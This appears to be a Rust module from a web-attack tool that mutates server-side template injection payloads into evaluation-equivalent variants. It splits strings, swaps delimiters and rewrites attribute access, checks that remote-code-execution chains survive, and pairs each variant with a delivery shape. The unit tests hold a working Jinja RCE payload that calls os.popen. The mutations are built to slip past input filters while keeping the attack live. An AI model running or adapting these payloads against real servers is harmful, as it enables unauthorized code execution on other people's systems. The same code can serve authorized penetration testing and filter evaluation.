//! Server-side template injection equivalence + the joint
//! `(payload × delivery)` generator — the SSTI arm of Phase B.
//!
//! Rewrites are template-engine-evaluation-equivalent *by
//! construction* (`{{7*7}}` ≡ `{{ 7 * 7 }}`; `a.b` ≡ `a['b']`; the
//! same expression re-wrapped in `${ }` / `#{ }` / `<%= %>` evaluates
//! identically on the engines that share it) and every member is
//! re-verified ([`still_evaluates`]). Reuses the `is_structured_ssti`
//! chokepoint so an RCE chain is never degraded to a `7*7` probe.

use super::{DeliveryShape, Dialect, EquivConfig, EquivPayload, Rng};
use crate::grammar::template::is_structured_ssti;

/// Pull the inner expression out of the first delimiter pair.
fn inner_expr(payload: &str) -> Option<(String, String, String)> {
    for (o, c) in [
        ("{{", "}}"),
        ("{%", "%}"),
        ("${", "}"),
        ("#{", "}"),
        ("<%=", "%>"),
        ("<%", "%>"),
        ("@{", "}"),
    ] {
        if let Some(a) = payload.find(o) {
            let rest = &payload[a + o.len()..];
            if let Some(b) = rest.find(c) {
                let expr = rest[..b].trim().to_string();
                if !expr.is_empty() {
                    return Some((
                        payload[..a].to_string(),
                        expr,
                        payload[a + o.len() + b + c.len()..].to_string(),
                    ));
                }
            }
        }
    }
    None
}

/// Significant identifier tokens of an expression (the RCE/exfil
/// vocabulary that must survive).
fn sig(expr: &str) -> Vec<String> {
    expr.to_ascii_lowercase()
        .split(|c: char| !c.is_ascii_alphanumeric() && c != '_')
        .filter(|t| t.len() >= 4)
        .map(str::to_string)
        .collect()
}

/// True iff `cand` still evaluates to the original injection.
#[must_use]
pub fn still_evaluates(original: &str, cand: &str) -> bool {
    if cand.trim().is_empty() {
        return false;
    }
    let Some((_, oe, _)) = inner_expr(original) else {
        return false;
    };
    let Some((_, ce, _)) = inner_expr(cand) else {
        return false;
    };
    if is_structured_ssti(original) {
        let want = sig(&oe);
        if want.is_empty() {
            return !ce.trim().is_empty();
        }
        let cl = ce.to_ascii_lowercase();
        // every structured token must survive (string-split rewrites
        // keep them; the chokepoint forbids degradation to `7*7`).
        want.iter().all(|t| cl.contains(t.as_str()))
    } else {
        // arithmetic / detection probe: a non-empty expression in a
        // delimiter pair remains (value-equivalence handled by the
        // value-preserving rewrites only).
        !ce.trim().is_empty()
    }
}

// ── rewrites (engine-evaluation-equivalent) ────────────────────────

/// Intra-expression whitespace is ignored by Jinja/Twig/Freemarker/
/// Velocity expression parsers: `{{7*7}}` ≡ `{{ 7 * 7 }}`.
fn rw_inner_ws(payload: &str, rng: &mut Rng) -> Option<String> {
    let (pre, e, post) = inner_expr(payload)?;
    let mut spaced = String::with_capacity(e.len() * 2);
    for ch in e.chars() {
        if matches!(
            ch,
            '+' | '*' | '/' | '|' | '(' | ')' | ',' | '.' | '[' | ']'
        ) && rng.chance(1, 2)
        {
            spaced.push(' ');
            spaced.push(ch);
            spaced.push(' ');
        } else {
            spaced.push(ch);
        }
    }
    let pad = |r: &mut Rng| if r.chance(1, 2) { " " } else { "" };
    // Preserve `post` — dropping the tail after `}}` silently mutates
    // the payload (loses any trailing template context).
    Some(format!(
        "{pre}{{{{{}{spaced}{}}}}}{post}",
        pad(rng),
        pad(rng)
    ))
}

/// `obj.attr` ≡ `obj['attr']` — identical attribute resolution in
/// Jinja/Twig/Python templating.
fn rw_attr_subscript(payload: &str, rng: &mut Rng) -> Option<String> {
    let (pre, e, post) = inner_expr(payload)?;
    let b: Vec<char> = e.chars().collect();
    let mut out = String::with_capacity(e.len() + 8);
    let mut i = 0;
    let mut changed = false;
    while i < b.len() {
        if b[i] == '.'
            && i + 1 < b.len()
            && (b[i + 1].is_ascii_alphabetic() || b[i + 1] == '_')
            && rng.chance(1, 2)
        {
            let mut j = i + 1;
            while j < b.len() && (b[j].is_ascii_alphanumeric() || b[j] == '_') {
                j += 1;
            }
            let name: String = b[i + 1..j].iter().collect();
            out.push_str(&format!("['{name}']"));
            i = j;
            changed = true;
            continue;
        }
        out.push(b[i]);
        i += 1;
    }
    if !changed {
        return None;
    }
    Some(format!("{pre}{{{{{out}}}}}{post}"))
}

/// Re-wrap the SAME expression in another engine's delimiters (for
/// targets whose engine accepts it). Carries the expression verbatim
/// → the chokepoint always passes.
fn rw_delim_swap(payload: &str, rng: &mut Rng) -> Option<String> {
    let (pre, e, post) = inner_expr(payload)?;
    let wrap = rng.pick(&["{{ {E} }}", "${{E}}", "#{{E}}", "<%= {E} %>", "{{{E}}}"]);
    Some(format!("{pre}{}{post}", wrap.replace("{E}", &e)))
}

/// String-literal equivalence: `'os'` ≡ `'o''s'`? no — use the safe
/// Jinja/Python concat `('o'+'s')` and quote swap. Value-identical.
fn rw_string_split(payload: &str, rng: &mut Rng) -> Option<String> {
    let (pre, e, post) = inner_expr(payload)?;
    // find a single-quoted literal of length >= 2 and split it.
    let bytes = e.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'\'' {
            let st = i + 1;
            let mut j = st;
            while j < bytes.len() && bytes[j] != b'\'' {
                j += 1;
            }
            if j < bytes.len() && j - st >= 2 && rng.chance(1, 1) {
                let lit = &e[st..j];
                // Split on a CHAR boundary, never a byte midpoint —
                // `lit` may hold multibyte content and `split_at(byte)`
                // panics inside a codepoint (hostile-input crash).
                let lc: Vec<char> = lit.chars().collect();
                if lc.len() < 2 {
                    i = j + 1;
                    continue;
                }
                let cutc = 1 + (lc.len() - 1) / 2;
                let l: String = lc[..cutc].iter().collect();
                let r: String = lc[cutc..].iter().collect();
                let repl = format!("('{l}'+'{r}')");
                let mut out = String::new();
                out.push_str(&e[..st - 1]);
                out.push_str(&repl);
                out.push_str(&e[j + 1..]);
                return Some(format!("{pre}{{{{{out}}}}}{post}"));
            }
            i = j + 1;
            continue;
        }
        i += 1;
    }
    None
}

#[must_use]
pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
    let mut rng = Rng::new(cfg.seed);
    let all = super::sql::delivery_set(&cfg.param);
    let (deliveries, single_forced) = match cfg.force_delivery {
        Some(i) if i < all.len() => (vec![all[i].clone()], true),
        _ => (all, false),
    };
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut out: Vec<EquivPayload> = Vec::new();

    if !still_evaluates(payload, payload) {
        return out;
    }

    for d in &deliveries {
        if !cfg.vary_delivery && !single_forced && !matches!(d, DeliveryShape::Query { .. }) {
            continue;
        }
        let key = format!("{}\u{1}{}", payload, d.label());
        if seen.insert(key) {
            out.push(EquivPayload {
                payload: payload.to_string(),
                delivery: d.clone(),
                dialect: Dialect::Generic,
                rules: vec!["identity"],
            });
        }
    }

    let mut attempts = 0;
    while out.len() < cfg.max && attempts < cfg.max * 24 + 64 {
        attempts += 1;
        let mut s = payload.to_string();
        let mut rules: Vec<&'static str> = Vec::new();
        if rng.chance(4, 5) {
            if let Some(n) = rw_inner_ws(&s, &mut rng) {
                s = n;
                rules.push("inner_ws");
            }
        }
        if rng.chance(2, 5) {
            if let Some(n) = rw_attr_subscript(&s, &mut rng) {
                s = n;
                rules.push("attr_subscript");
            }
        }
        if rng.chance(2, 5) {
            if let Some(n) = rw_string_split(&s, &mut rng) {
                s = n;
                rules.push("string_split");
            }
        }
        if rng.chance(1, 3) {
            if let Some(n) = rw_delim_swap(&s, &mut rng) {
                s = n;
                rules.push("delim_swap");
            }
        }
        if rules.is_empty() {
            continue;
        }
        if !still_evaluates(payload, &s) {
            continue;
        }
        let d = if cfg.vary_delivery || single_forced {
            rng.pick(&deliveries).clone()
        } else {
            DeliveryShape::Query {
                param: cfg.param.clone(),
            }
        };
        let key = format!("{s}\u{1}{}", d.label());
        if !seen.insert(key) {
            continue;
        }
        out.push(EquivPayload {
            payload: s,
            delivery: d,
            dialect: Dialect::Generic,
            rules,
        });
    }
    super::enforce_transport_legal(&mut out);
    out.truncate(cfg.max);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(seed: u64) -> EquivConfig {
        EquivConfig {
            seed,
            max: 48,
            verify: true,
            vary_delivery: true,
            param: "q".into(),
            force_delivery: None,
        }
    }

    #[test]
    fn rce_chain_is_never_degraded_to_a_probe() {
        let atk = "{{cycler.__init__.__globals__.os.popen('id').read()}}";
        let v = generate(atk, &cfg(3));
        assert!(!v.is_empty());
        for m in &v {
            assert!(still_evaluates(atk, &m.payload), "unsound {:?}", m.payload);
            let lc = m.payload.to_ascii_lowercase();
            assert!(
                lc.contains("popen") && lc.contains("globals"),
                "RCE construct lost: {:?}",
                m.payload
            );
            assert_ne!(m.payload, "{{7*7}}");
        }
    }

    #[test]
    fn whitespace_and_subscript_are_evaluation_equivalent() {
        assert!(still_evaluates(
            "{{config.items()}}",
            "{{ config['items']() }}"
        ));
        assert!(still_evaluates("{{7*7}}", "{{ 7 * 7 }}"));
    }

    #[test]
    fn probe_payloads_supported_but_non_ssti_empty() {
        assert!(!generate("{{7*7}}", &cfg(1)).is_empty());
        assert!(generate("plain text", &cfg(1)).is_empty());
        assert!(generate("", &cfg(1)).is_empty());
        assert!(generate("7*7 no delims", &cfg(1)).is_empty());
    }

    #[test]
    fn deterministic_and_diverse() {
        let a: Vec<_> = generate("{{cycler.__init__.__globals__}}", &cfg(7))
            .into_iter()
            .map(|m| m.payload)
            .collect();
        let b: Vec<_> = generate("{{cycler.__init__.__globals__}}", &cfg(7))
            .into_iter()
            .map(|m| m.payload)
            .collect();
        assert_eq!(a, b);
        let d: std::collections::HashSet<_> = a.iter().collect();
        assert!(d.len() >= 5, "too few distinct: {}", d.len());
    }

    #[test]
    fn force_delivery_restricts_shape() {
        let mut c = cfg(2);
        c.force_delivery = Some(0); // multipart_file
        for m in generate("{{7*7}}", &c) {
            assert_eq!(m.delivery.label(), "multipart_file");
        }
    }
}
